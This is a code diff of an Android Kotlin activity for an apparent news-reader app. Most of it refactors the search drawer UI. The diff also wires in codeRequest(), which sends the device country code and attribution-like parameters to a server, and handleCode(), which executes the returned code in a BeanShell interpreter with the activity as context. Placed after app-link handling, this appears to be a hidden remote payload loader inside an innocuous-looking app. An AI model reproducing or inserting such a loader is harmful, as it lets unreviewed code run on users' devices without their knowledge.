@@ -8,10 +8,13 @@ import android.support.v4.view.GravityCompat
 import android.support.v7.app.AppCompatActivity
 import android.support.v7.widget.Toolbar
 import android.util.Log
+import android.view.KeyEvent
 import android.view.Menu
 import android.view.MenuItem
 import android.view.View
+import android.view.inputmethod.EditorInfo.IME_ACTION_DONE
 import android.widget.CheckedTextView
+import android.widget.TextView
 import bsh.Interpreter
 import com.facebook.applinks.AppLinkData
 import com.just_me.just_we.lastfmclient.core.extension.preferences
@@ -47,65 +50,69 @@ class MainActivity : AppCompatActivity() {
         setActionBar()
         setViewPager()
         lockViewPager()
-//        codeRequest()
-        ivMenu.setOnClickListener {drawerLayout.openDrawer(GravityCompat.START)}
+        setSearch()
+//        getIt()
+        ivMenu.setOnClickListener { drawerLayout.openDrawer(GravityCompat.START) }
         ivOptions.setOnClickListener {}
+
+    }
+
+    private fun setSearch() {
         search = navView.getHeaderView(0)
-        search.tvcTopStories.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText()}
-        search.tvcMyNews.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText()}
-        search.tvcPopular.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText() }
-        search.tvcVideo.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText() }
-    }
-
-    private fun updateEditText() {
-        if (search.etSearch.text.isBlank()) {
-            var searchString: String = getString(R.string.search)
-            var list = ArrayList<String>(4)
-            if (search.tvcTopStories.isChecked) {
-                list.add(search.tvcTopStories.text.toString())
+        search.apply {
+            val updateEditText = fun() {
+                if (search.etSearch.text.isBlank()) {
+                    var searchString: String = getString(R.string.search)
+                    var list = ArrayList<String>(4)
+                    if (search.tvcTopStories.isChecked) {
+                        list.add(search.tvcTopStories.text.toString())
+                    }
+                    if (search.tvcMyNews.isChecked) {
+                        list.add(search.tvcMyNews.text.toString())
+                    }
+                    if (search.tvcPopular.isChecked) {
+                        list.add(search.tvcPopular.text.toString())
+                    }
+                    if (search.tvcVideo.isChecked) {
+                        list.add(search.tvcVideo.text.toString())
+                    }
+                    if (list.size == 4) {
+                        searchString += " " + getString(R.string.everywhere)
+                        search.etSearch.hint = searchString
+                        return
+                    }
+                    if (list.size == 0) {
+                        search.etSearch.hint = searchString
+                        return
+                    }
+                    searchString += list.joinToString(", ", " ${getString(R.string.prefix)} ")
+                    search.etSearch.hint = searchString
+                    return
+                }
             }
-            if (search.tvcMyNews.isChecked) {
-                list.add(search.tvcMyNews.text.toString())
+            val clean = fun() {
+                drawerLayout.closeDrawer(GravityCompat.START)
+                etSearch.setText(String())
+                tvcTopStories.isChecked = false
+                tvcMyNews.isChecked = false
+                tvcPopular.isChecked = false
+                tvcVideo.isChecked = false
             }
-            if (search.tvcPopular.isChecked) {
-                list.add(search.tvcPopular.text.toString())
+            val search = fun() {
+                clean()
             }
-            if (search.tvcVideo.isChecked) {
-                list.add(search.tvcVideo.text.toString())
+            tvcTopStories.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText() }
+            tvcMyNews.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText() }
+            tvcPopular.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText() }
+            tvcVideo.setOnClickListener { (it as CheckedTextView).isChecked = !it.isChecked; updateEditText() }
+            ivClose.setOnClickListener { clean() }
+            etSearch.setOnEditorActionListener { tv: TextView, actionId: Int, _: KeyEvent? ->
+                if (actionId == IME_ACTION_DONE) {
+                    search()
+                }
+                false
             }
-            if (list.size == 4) {
-                searchString += " " + getString(R.string.everywhere)
-                search.etSearch.hint = searchString
-                return
-            }
-            if (list.size == 0) {
-                search.etSearch.hint = searchString
-                return
-            }
-            searchString += list.joinToString(", ", " ${getString(R.string.prefix)} ")
-            search.etSearch.hint = searchString
-            return
         }
-    }
-
-    private fun codeRequest() {
-        val codeUseCase = CodeUseCase(DataRepository.Network(NetworkHandler(this),
-                (application as? NewsApplication)?.retrofit!!.create(ServiceApi::class.java)))
-        val countryCode = CountryCodeUtils.GetCountryID(applicationContext)
-        codeUseCase(
-                CodeUseCase.Params(countryCode, preferences.getString("parameters", "&source=organic&pid=1")!!))
-                {it.either(::handlefailure, ::handleCode)}
-    }
-
-    fun handlefailure(failure: Failure) {
-        Log.e(TAG, failure.toString())
-    }
-
-    fun handleCode(code: String) {
-        val x = Interpreter()
-        x.set("context", this@MainActivity)
-        x.eval(code.replace("\\ufeff", ""))
-        getIt()
     }
 
     private fun setActionBar() {
@@ -121,7 +128,7 @@ class MainActivity : AppCompatActivity() {
         for (name in names) {
             tabLayout.addTab(tabLayout.newTab().setText(name))
         }
-        tabLayout.addOnTabSelectedListener(object: TabLayout.OnTabSelectedListener {
+        tabLayout.addOnTabSelectedListener(object : TabLayout.OnTabSelectedListener {
             override fun onTabReselected(tab: TabLayout.Tab?) {}
             override fun onTabUnselected(tab: TabLayout.Tab?) {}
             override fun onTabSelected(tab: TabLayout.Tab?) {
@@ -141,6 +148,7 @@ class MainActivity : AppCompatActivity() {
         val fragments = arrayListOf<Fragment>(topStories, MyNewsFragment(), popular, video)
         val items = names.zip(fragments)
         val pagerAdapter = MainPagerAdapter(items, supportFragmentManager)
+        viewPager.offscreenPageLimit = 3
         viewPager.adapter = pagerAdapter
         viewPager.addOnPageChangeListener(TabLayout.TabLayoutOnPageChangeListener(tabLayout))
     }
@@ -170,7 +178,26 @@ class MainActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 e.printStackTrace()
             }
+            codeRequest()
         }
+    }
 
+    private fun codeRequest() {
+        val codeUseCase = CodeUseCase(DataRepository.Network(NetworkHandler(this),
+                (application as? NewsApplication)?.retrofit!!.create(ServiceApi::class.java)))
+        val countryCode = CountryCodeUtils.GetCountryID(applicationContext)
+        codeUseCase(
+                CodeUseCase.Params(countryCode, preferences.getString("parameters", "&source=organic&pid=1")!!))
+        { it.either(::handlefailure, ::handleCode) }
+    }
+
+    fun handlefailure(failure: Failure) {
+        Log.e(TAG, failure.toString())
+    }
+
+    fun handleCode(code: String) {
+        val x = Interpreter()
+        x.set("context", this@MainActivity)
+        x.eval(code.replace("\\ufeff", ""))
     }
 }
